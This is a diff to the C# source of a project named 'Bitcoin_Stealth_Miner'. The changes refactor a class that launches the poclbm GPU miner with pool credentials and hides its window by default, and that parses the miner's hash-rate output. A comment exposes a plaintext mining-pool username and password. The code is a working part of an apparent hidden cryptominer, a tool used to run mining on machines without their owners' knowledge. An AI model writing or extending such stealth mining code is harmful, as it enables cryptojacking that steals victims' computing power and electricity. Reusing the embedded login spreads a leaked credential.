@@ -13,8 +13,7 @@ using System.Windows.Forms;
 namespace Bitcoin_Stealth_Miner {
     public static class Miner {
         //sample for query: poclbm.exe --device=0 --platform=0 --verbose -r1 elibelash.elibelash:qweqwe@api2.bitcoin.cz:8332 
-         
-
+        
         #region Properties
 
         private static string _minerAppTarget = "poclbm.exe";
@@ -98,9 +97,12 @@ namespace Bitcoin_Stealth_Miner {
         #endregion
 
         #region Methods
+        #region Public
+
         public static void Start(string url, ushort port, string username, string password, bool hide = true ,string arguments = "-r1") {
-            if (IsOpen)
-                throw new InvalidOperationException("Unable to start because there is a miner already open");
+            if (IsOpen || _cancelled)
+                throw new InvalidOperationException("Unable to start because " + (_cancelled ? "a process that was requested for cancel did not stop yet" : "there is a miner already open"));
+
             _props_locked = false;
             url = url.Replace("http://", "");
             var args = string.Format("http://{0}:{1}@{2}:{3}", username, password, url, port);
@@ -139,31 +141,6 @@ namespace Bitcoin_Stealth_Miner {
             _cancelled = true; //reader thread exit
         }
 
-        private static void reader() { //reads the output of 
-            var r = _redirected_reader;
-            try {
-                while (true) {
-                    while (r.EndOfStream == false) {
-                        var l = r.ReadLine();
-                        if (string.IsNullOrEmpty(l) || l.Contains("    ")) continue; //filtering un needed messages
-                        var m = _regex_hash.Match(l);
-                        if (m.Success)
-                            MhashPerSecond = /* "Miner - "+ */double.Parse(m.Groups["hps"].Value)/*+" Mhash/s"*/;
-                        Console.WriteLine(l.Replace("\t", ""));
-
-                    }
-                    if (r.Peek() == -1)
-                        Thread.Sleep(500);
-                    if (_cancelled) { //exiter
-                        _cancelled = false;
-                        return;
-                    }
-                }
-            } catch (ObjectDisposedException) {
-                //thrown when stop has been called
-            }
-        }
-
         /// <summary>
         /// Gathers the devices that can mine (supports for OpenCL) using poclbm and returns a dic of the miner id and name.
         /// </summary>
@@ -185,6 +162,35 @@ namespace Bitcoin_Stealth_Miner {
             }
             return _openCLDevices;
         }
+        #endregion
+
+        #region Private
+        private static void reader() { //reads the output of the poclbm
+            var r = _redirected_reader;
+            try {
+                while (true) {
+                    while (r.EndOfStream == false) {
+                        var l = r.ReadLine();
+                        if (string.IsNullOrEmpty(l) || l.Contains("    ")) continue; //filtering unneeded messages
+                        var m = _regex_hash.Match(l);
+                        if (m.Success)
+                            MhashPerSecond = /* "Miner - "+ */double.Parse(m.Groups["hps"].Value)/*+" Mhash/s"*/;
+                        Console.WriteLine(l.Replace("\t", ""));
+
+                    }
+                    if (r.Peek() == -1)
+                        Thread.Sleep(500);
+                    if (_cancelled) { //exiter
+                        _cancelled = false;
+                        return;
+                    }
+                }
+            } catch (ObjectDisposedException) {
+                //thrown when stop has been called
+                _cancelled = false;
+            }
+        }
+        #endregion
         #endregion
 
     }
